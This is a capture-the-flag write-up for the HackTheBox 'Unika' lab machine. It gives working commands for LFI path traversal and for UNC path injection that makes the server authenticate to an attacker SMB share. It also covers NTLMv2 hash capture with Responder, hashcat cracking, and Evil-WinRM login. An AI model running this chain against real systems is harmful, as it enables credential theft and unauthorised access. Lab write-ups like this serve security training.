# Unika — HackTheBox

| Field | Detail |
|---|---|
| OS | Windows |
| Difficulty | Easy |
| Platform | HTB Starting Point |
| IP | 10.129.95.234 |
| User flag | checkmark |
| Root flag | checkmark |
| Site writeup | [jostif.pages.dev](https://jostif.pages.dev/writeups/unika) |

**Techniques:** LFI via path traversal → UNC path injection → NTLMv2 capture (Responder) → Hashcat → Evil-WinRM

---

## Summary

Beginner-friendly Windows machine. LFI via path traversal leads to UNC path injection capturing NTLMv2 hashes via Responder, cracked with Hashcat for administrator access.

**Chain:** nmap → LFI → UNC path → Responder → hashcat → evil-winrm

---

## 01 — Reconnaissance

```bash
nmap -sC -sV -oN unika.txt 10.129.95.234
```

```
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.52 ((Win64) PHP/8.1.1)
```

Only port 80 open — Apache with PHP on Windows. Single exposed service.

---

## 02 — Web Enumeration

```bash
echo "10.129.95.234 unika.htb" | sudo tee -a /etc/hosts
# URL observed: http://unika.htb/index.php?page=german.php
# 'page' param loads files — potential LFI
```

---

## 03 — LFI — Path Traversal

```
# Confirm LFI — read Windows hosts file
http://unika.htb/index.php?page=../../../../windows/system32/drivers/etc/hosts
# 127.0.0.1 localhost  <- returned, LFI confirmed

# Weaponize — UNC path triggers NTLMv2 auth
http://unika.htb/index.php?page=\\10.10.14.22\share\x
```

> Windows authenticates automatically when resolving UNC paths, sending NTLMv2 credentials. Responder intercepts this.

---

## 04 — NTLMv2 Capture

```bash
# Terminal 1
sudo responder -I tun0

# Terminal 2 — trigger
curl "http://unika.htb/index.php?page=\\\\10.10.14.22\\share\\x"
# [SMB] NTLMv2 Hash: administrator::UNIKA:4e6d35...
```

---

## 05 — Hash Cracking

```bash
hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
# ADMINISTRATOR::UNIKA:... : badminton
```

**Credentials:** `administrator : badminton`

---

## 06 — Flags

```bash
evil-winrm -i 10.129.95.234 -u administrator -p badminton

type C:\Users\mike\Desktop\flag.txt       # user flag
type C:\Users\Administrator\Desktop\flag.txt  # root flag
```
